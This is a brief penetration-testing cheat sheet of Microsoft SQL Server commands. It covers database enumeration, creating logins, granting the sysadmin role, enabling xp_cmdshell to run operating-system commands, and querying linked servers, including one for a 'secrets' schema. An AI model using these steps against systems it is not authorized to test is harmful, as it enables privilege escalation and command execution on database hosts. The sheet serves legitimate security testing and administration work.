Useful commands for pentesting Microsoft SQL Server instances:

	# Get current database
		example: SELECT DB_NAME();

	# Get all databases
		example: SELECT name FROM master..sysdatabases;

	# Show all tables of current database
		example: select * from information_schema.tables;

	# Show all columns of table
		syntax : select * from information_schema.colums where table_name = '<tablename>';

	# Create user
		syntax : exec master..sp_addlogin <username>, <password>;
		syntax : create login <username> with password='<password>';

	# Select users with sysadmin rights
		example: select loginname from syslogins where sysadmin = 1;

	## Check if current user is in given role
		syntax : select is_srvrolemember('<role>');
		example: select is_srvrolemember('sysadmin');

	# Add user to certain role
		syntax : exec sp_addsrvrolemember '<username>', '<role>';
		example: exec sp_addsrvrolemember 'developer', 'sysadmin';

	# Enable xp_cmdshell to execute commands on the underlying system
		Step 1(host): EXEC SP_CONFIGURE 'show advanced options', 1
		Step 2(host): reconfigure
		Step 3(host): go
		Step 4(host): EXEC SP_CONFIGURE 'xp_cmdshell', 1
		Step 5(host): reconfigure
		Step 6(host): go

		Optional step 7(host): xp_cmdshell 'whoami'
		Optional Step 7(host): go

	# Check linked servers and execute commands on them
		Step 1 : sp_linkedservers
		Step 2 : EXECUTE('<sqlCommand>') AT "<sqlServer>"
		example: EXECUTE(' select * from information_schema.tables where table_schema = ''secrets'' ') AT "ECORP\SECRET_DB"
